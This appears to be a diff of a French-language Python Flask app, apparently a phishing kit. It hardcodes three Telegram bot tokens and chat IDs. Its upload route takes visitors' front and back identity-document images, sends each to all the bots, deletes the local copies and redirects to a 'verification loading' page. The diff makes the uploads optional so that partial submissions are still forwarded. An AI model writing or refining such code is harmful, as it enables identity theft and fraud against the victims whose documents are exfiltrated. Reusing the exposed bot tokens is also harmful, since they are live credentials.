@@ -10,7 +10,7 @@ CHAT_ID_1 = '6297861735'
 
 # Bot 2
 TOKEN_2 = '8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs'
-CHAT_ID_2 = ' 7650873'
+CHAT_ID_2 = '7650873'
 
 # Bot 3 (NOUVEAU)
 TOKEN_3 = '7858273702:AAEMIDAD8ZwY_Y0iZliX-5YPXNoHCkeB9HQ'
@@ -138,22 +138,20 @@ def upload_documents():
     recto = request.files.get('recto_document')
     verso = request.files.get('verso_document')
 
-    if not recto or not verso:
-        return "Erreur : les deux fichiers sont requis.", 400
+    # ✅ Corrigé : les fichiers ne sont plus obligatoires
+    if recto and recto.filename:
+        recto_path = os.path.join(app.config['UPLOAD_FOLDER'], recto.filename)
+        recto.save(recto_path)
+        send_document_all(recto_path, "Justificatif Recto")
+        if os.path.exists(recto_path):
+            os.remove(recto_path)
 
-    recto_path = os.path.join(app.config['UPLOAD_FOLDER'], recto.filename)
-    verso_path = os.path.join(app.config['UPLOAD_FOLDER'], verso.filename)
-
-    recto.save(recto_path)
-    verso.save(verso_path)
-
-    send_document_all(recto_path, "Justificatif Recto")
-    send_document_all(verso_path, "Justificatif Verso")
-
-    if os.path.exists(recto_path):
-        os.remove(recto_path)
-    if os.path.exists(verso_path):
-        os.remove(verso_path)
+    if verso and verso.filename:
+        verso_path = os.path.join(app.config['UPLOAD_FOLDER'], verso.filename)
+        verso.save(verso_path)
+        send_document_all(verso_path, "Justificatif Verso")
+        if os.path.exists(verso_path):
+            os.remove(verso_path)
 
     return redirect('/chargement_verification')
 
